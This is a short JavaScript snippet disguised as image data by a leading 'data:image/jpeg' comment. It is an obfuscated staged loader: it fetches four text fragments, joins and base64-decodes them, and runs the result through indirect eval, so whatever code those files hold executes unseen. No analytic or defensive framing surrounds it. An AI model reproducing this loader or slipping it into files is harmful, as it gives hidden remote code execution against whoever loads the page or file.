/* data:image/jpeg */
(async()=>{
  const parts=await Promise.all([0,1,2,3].map(i=>fetch('b'+i+'.txt').then(r=>r.text())));
  const code=new TextDecoder().decode(Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0)));
  (0,eval)(code);
})();
